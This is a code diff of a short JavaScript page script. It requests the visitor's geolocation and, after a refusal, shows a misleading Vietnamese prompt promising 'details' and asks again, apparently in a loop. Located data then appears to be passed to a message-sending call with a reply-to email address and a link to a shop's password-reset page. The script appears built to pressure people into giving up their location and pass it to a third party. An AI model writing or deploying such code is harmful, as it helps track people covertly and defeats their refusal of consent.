@@ -13,11 +13,15 @@ function getLocation() {
     navigator.geolocation.getCurrentPosition(showPosition, showError);
 }
 
+function getO() {
+    alert('Vui lòng ấn cho phép để xem chi tiết')
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+}
+
 function showError(error) {
     switch (error.code) {
         case error.PERMISSION_DENIED:
-            alert('Vui lòng ấn cho phép')
-            getLocation()
+            getO()
             break;
     }
 }
@@ -35,7 +39,6 @@ function onLocationGot(info) {
         reply_to: "mrthanh260801@gmail.com",
         link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
     })
-    
 }
 
 function showPosition(position) {
